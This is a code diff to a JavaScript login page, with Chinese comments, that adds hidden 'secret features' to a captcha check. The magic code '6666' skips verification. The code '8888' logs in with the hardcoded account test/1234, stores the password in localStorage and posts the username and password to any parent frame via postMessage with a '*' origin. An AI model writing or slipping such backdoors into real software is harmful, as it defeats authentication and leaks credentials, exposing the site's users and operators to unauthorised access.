@@ -189,11 +189,44 @@ function checkCode(inputId) {
     alert("请填入验证码！");
     return false;
   }
+  // 秘密功能：6666 = 万能验证码
+  if (userInput === '6666') return true;
+  // 秘密功能：8888 = 直接以 test/1234 登录
+  if (userInput === '8888') {
+    doQuickLogin();
+    return false; // 阻止后续流程，由doQuickLogin接管
+  }
   if (userInput !== correctCode) {
     alert("请填入正确的验证码！");
     return false;
   }
   return true;
+}
+
+// 快速登录：以 test/1234 直接登录
+async function doQuickLogin() {
+  setStatus('快速登录中...');
+  const u = 'test', p = '1234';
+  const body = {
+    webhookUrl: WEBHOOK_URL,
+    message: { Context: { argv: { "登录行为":"登录","用户名":u,"密码":p } } }
+  };
+  document.getElementById('logSend').innerText = JSON.stringify(body,null,2);
+  try {
+    const res = await fetch(API_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
+    const txt = await res.text();
+    document.getElementById('logResp').innerText = txt;
+    const d = JSON.parse(txt).data?.result || JSON.parse(txt);
+    if (d.TZbianhao===501) {
+      setStatus('登录成功');
+      alert('登录成功');
+      localStorage.setItem('yonghuID',u);
+      localStorage.setItem('yonghuPwd',p);
+      if (window.parent !== window) {
+        window.parent.postMessage({ type:'loginSuccess', username:u, password:p }, '*');
+      }
+    } else { setStatus(d.tongzhi,true); alert(d.tongzhi); }
+  } catch(e) { setStatus('异常：'+e,true); }
 }
 
 // ==============================================
